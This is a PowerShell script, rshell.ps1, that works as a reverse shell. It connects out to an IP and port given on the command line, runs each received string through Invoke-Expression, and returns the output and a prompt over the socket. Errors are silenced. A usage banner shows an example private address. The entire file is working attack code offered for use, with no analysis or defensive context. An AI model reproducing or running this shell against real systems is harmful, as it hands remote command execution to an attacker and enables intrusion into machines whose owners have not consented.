
## USE: .\rshell.ps1 IP PORT
## EX: .\rshell.ps1 192.168.56.22 9090
echo @'

## USE .\rshell.ps1 [IP] [PORT]
### EX: .\rshell.ps1 192.168.56.22 9090

'@
$ErrorActionPreference= 'silentlycontinue'
$hostip = $args[0]
[int]$port = $args[1]
$client = New-Object System.Net.Sockets.TCPClient($hostip, $port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();
